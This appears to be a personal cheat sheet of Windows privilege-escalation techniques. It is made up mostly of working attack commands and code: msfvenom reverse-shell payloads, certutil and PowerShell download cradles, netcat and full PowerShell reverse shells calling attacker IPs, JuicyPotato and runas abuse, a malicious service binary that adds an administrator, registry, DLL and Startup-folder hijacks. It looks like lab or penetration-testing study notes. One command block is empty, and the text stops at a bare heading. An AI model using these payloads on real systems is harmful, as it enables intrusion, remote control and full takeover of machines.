Create payload with msfvenom
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=Kali VM IP Address] lport=4444 -f exe -o program.exe

msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] lport=4444 -f msi -o setup.msi
```

Powershell from cmd
```
powershell -ep bypass
```

Download file on the machine
```cmd
certutil -urlcache -f "<URL>" "<output_filename>"
powershell -Command "Invoke-WebRequest -Uri 'http://IP/FILE' -OutFile 'FILE'"
```

Port Forward port only available internally
```cmd
plink.exe -l root -pw root -R [Port]:127.0.0.1:[Port] [Ur_IP]
```
# Kernel Exploit

[Windows Kernel Exploit]([https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits))

Use [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) to find Vuln , first on you attacker machine
```bash
./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
```

Search online if any exploit is found

# WLS Escalation

To find where is the wls.exe
```cmd
where /R c:\ wsl.exe
```

# Potato Attack

See privilege first with 
```cmd
whoami /priv
```

Need to have one of these 2 privileges
```cmd
SeAssignPrimaryToken
SeImpersonate
```

And A COM server with a unique CLSID. The authors of juicy Potato compiled lists of unique CLSIDs for different Windows versions to abuse — [**_http://ohpe.it/juicy-potato/CLSID/_**](http://ohpe.it/juicy-potato/CLSID/).

https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#eop-impersonation-privileges

[Rotten Potato](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)

[Juicy Potato](https://github.com/ohpe/juicy-potato)

1. Upload netcat to the victim
2. Upload a priv.bat file to the victim
```
C:\Users\kohsuke\Desktop\nc.exe -e cmd.exe [UR_IP] 9003
```
3. Listen on your machine
4. Upload JuicyPotato the the victim
5. Run JuicyPotato
```
jp.exe -p priv.bat -l 9003 -t * -c [CLSID]
```

# Alternate Data Stream

To see alternate data stream
```cmd
dir /R

EX : 34 hm.txt:root.txt:$DATA
```

To read it
```cmd
powershell -Command "Get-Content -Path 'hm.txt' -Stream 'root.txt'"

OR

more < hm.txt:root.txt:$DATA
```

# Runas Escalation

To see if we have any runas credentials
```powershell
cmdkey /list
```

To use Runas
```powershell
runas /savecred /user:Administrator "C:\Users\security\Desktop\nc.exe -e cmd.exe 10.10.14.10 12345"
```

To read a file easily
```powershell
runas /savecred /user:Administrator "cmd.exe /c TYPE [file_path] > [newfile]"
```

We can also add domain if we want
```powershell
runas /savecred /user:ACCESS\Administrator ""
```
# Getting a Reverse Shell cmd to powershell

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.10',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

From the Victim 
```cmd
START /B "" powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.10/rshell.ps1')
```

```
powershell -Command "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.10',12345);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -Ty  
peName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($se  
ndbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

# Registry Escalation

## Autorun
To see autorun visually
```
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
```

Cmd way
```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
```

[Accesschk64.exe](https://github.com/jsecurity-rocks/Tools/blob/main/accesschk.exe)

We can also use Powerup to find this [Powerup.ps1](https://github.com/jsecurity-rocks/Tools/blob/main/PowerUp.ps1)

If we have write permission we can change it for an reverse shell created with msfvenom

## AlwaysInstalledElevated
To see if this will work
```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer

NEEDS
AlwaysInstalledElevated     REG_DWORD    0X1

reg query HKCU\Software\Policies\Microsoft\Windows\Installer

NEEDS
AlwaysInstalledElevated     REG_DWORD    0X1
```

If we runned ```PowerUp``` a quick way to exploit this is to run ```Write-UserAddMSI```

To run ```PowerUp```

```powershell
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks

IF FOUND
Write-UserAddMSI
```

We can run manually by making a payload as well
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] lport=4444 -f msi -o setup.msi

COPY IT ON THE MACHINE IN C:\Windows\Temp
and run it with

msiexec /quiet /qn /i** **C:\Temp\setup.msi
```
**Dont forget to listen on the specifed port**

## Regsvc ACL

In PowerShell we can see if we have any permission over registry key
```
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```

![[Pasted image 20241110140101.png]]

Ex ```windows_service.c``` file
```c
#include <windows.h>
#include <stdio.h>

#define SLEEP_TIME 5000

SERVICE_STATUS ServiceStatus; 
SERVICE_STATUS_HANDLE hStatus; 
 
void ServiceMain(int argc, char** argv); 
void ControlHandler(DWORD request); 

//add the payload here
int Run() 
{ 
    system("cmd.exe /k net localgroup administrators user /add");
    return 0; 
} 

int main() 
{ 
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = "MyService";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
 
    StartServiceCtrlDispatcher(ServiceTable);  
    return 0;
}

void ServiceMain(int argc, char** argv) 
{ 
    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0; 
    ServiceStatus.dwServiceSpecificExitCode = 0; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0; 
 
    hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler); 
    Run(); 
    
    ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
    SetServiceStatus (hStatus, &ServiceStatus);
 
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
                Sleep(SLEEP_TIME);
    }
    return; 
}

void ControlHandler(DWORD request) 
{ 
    switch(request) 
    { 
        case SERVICE_CONTROL_STOP: 
                        ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
 
        case SERVICE_CONTROL_SHUTDOWN: 
            ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
        
        default:
            break;
    } 
    SetServiceStatus (hStatus,  &ServiceStatus);
    return; 
} 
```

After that we can change the system("cmd.exe /k net localgroup administrators user /add") to run any command we want

After we need to compile it
```bash
#sudo apt install gcc-mingw-w64
x86_64-w64-mingw32-gcc windows_service.c -o x.exe
```

If you putted it in C:\Windows\Temp
```batch
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f

sc start regsvc
```

And with that the user -> User will be added to the Administrators Group

# Executable Files

When running ```PowerUp``` we can quickly see if the target is vulnerable
![[Pasted image 20241112181616.png]]

To manually check if we have RW on an executable
```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "[FILE_PATH]"
```

After we can just copy our payload directly to the Executable path
```
 copy /y [PAYLOAD_PATH] "[EXECUTABLE_PATH]"
```

# Startup Application

To see the permission of the startup Application
```
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

![[Pasted image 20241112185531.png]]

(F) -> Full Access
(M) -> Modify

For example we can generate a ```msfvenom ```payload 
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.5.7 lport=4444 -f exe -o setup.exe
```

While listening with ```multi/handler``` on ```msfconsole```

**Don't forget to set the payload to ``` windows/meterpreter/reverse_tcp```**

Copy the newly ```setup.exe``` directly in the Startup folder & when someone connect we will get a reverse shell

# DLL Hijacking

We can find dll error with this command
```

```

If there is any writable path found we can hijack the dll first lets create a .dll source code
```
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>

BOOL WINAPI DllMain(
    HANDLE hDll,      // Handle to DLL module
    DWORD dwReason,   // Reason for calling function
    LPVOID lpReserved // Reserved
) {
    // Check if DLL is being loaded
    if (dwReason == DLL_PROCESS_ATTACH) {
        // Execute command and redirect output
        system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
        
        // Exit the process
        ExitProcess(0);
    }
    
    return TRUE;
}
```

Then we can compile it
```
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll
```

Stop the service using this .dll and put the hijacked.dll in the path and restart the service

# Service Permission

